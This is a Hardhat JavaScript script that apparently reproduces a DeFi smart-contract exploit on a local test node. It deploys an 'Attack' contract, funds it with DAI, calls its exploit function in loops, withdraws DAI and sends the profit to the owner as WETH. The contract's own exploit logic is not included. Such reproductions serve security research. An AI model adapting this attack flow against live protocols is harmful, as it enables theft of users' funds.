
const hre = require("hardhat");
const Web3 = require('web3');
const ethers = require('ethers');

async function main() {

  await hre.run('compile');

  const myDummyAccount = "0x8626f6940E2eb28930eFb4CeF49B2d1F2C9C1199";
  const _gas = 15000000;
  const _gasPrice = '30000000000000';
  const web3 = new Web3("http://127.0.0.1:8545/");


  const jsonAttackFile = require('../artifacts/contracts/Attacker.sol/Attack.json');
  const jsonAttackABI = jsonAttackFile.abi;
  var atkContract = new web3.eth.Contract(jsonAttackABI);
  atkContract.options.data = jsonAttackFile.bytecode;

  console.log("Starting...");

  // > NOTE <
  // First, we assume that our malicious contract has a starting balance of at least 1,000 DAI.
  // For this reason, we deploy it in the testing script with 10 ETH, which we then exchange for 1,000 DAI 
  // (we could also use Flash Loans as in the actual scenario, but this is not our main purpose).

  await atkContract.deploy({ })
  .send({
      from: myDummyAccount, value: ethers.utils.parseEther('10'), gas: _gas, gasPrice: _gasPrice
  }, function(error, transactionHash){ console.log(error, transactionHash); })
  .on('error', function(error){ console.log(error); })
  .then(function(newContractInstance){
      console.log("Atk Contract address: ", newContractInstance.options.address)
      atkContract.options.address = newContractInstance.options.address;
  });

  await atkContract.methods.checkBalance().send({from: myDummyAccount, gas: _gas, gasPrice: _gasPrice}, function(error, transactionHash){
      console.log(error, transactionHash);
  });

  var loops = 11;
  for (var i = 0; i < loops; i++) {
    console.log("Running exploit " + (i+1));
    atkContract.methods.exploit(7).send({from: myDummyAccount, gas: _gas, gasPrice: _gasPrice}, function(error, transactionHash){
      console.log(error, transactionHash);
    });
  }

    atkContract.methods.exploit(2).send({from: myDummyAccount, gas: _gas, gasPrice: _gasPrice}, function(error, transactionHash){
      console.log(error, transactionHash);
    });

  loops = 3;
  for (var i = 0; i < loops; i++) {
    console.log("Running withdraw " + (i+1));
    await atkContract.methods.withdraw_dai().send({from: myDummyAccount, gas: _gas, gasPrice: _gasPrice}, function(error, transactionHash){
      console.log(error, transactionHash);
    });
  }

  await atkContract.methods.checkBalance().send({from: myDummyAccount, gas: _gas, gasPrice: _gasPrice}, function(error, transactionHash){
      console.log(error, transactionHash);
  });

  await atkContract.methods.send_profit_to_owner_as_weth().send({from: myDummyAccount, gas: _gas, gasPrice: _gasPrice}, function(error, transactionHash){
      console.log(error, transactionHash);
  });

  await atkContract.methods.checkBalance().send({from: myDummyAccount, gas: _gas, gasPrice: _gasPrice}, function(error, transactionHash){
      console.log(error, transactionHash);
  });

  console.log("Exitting...");
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
// main().catch((error) => {
//   console.error(error);
//   process.exitCode = 1;
// });
// 

main();
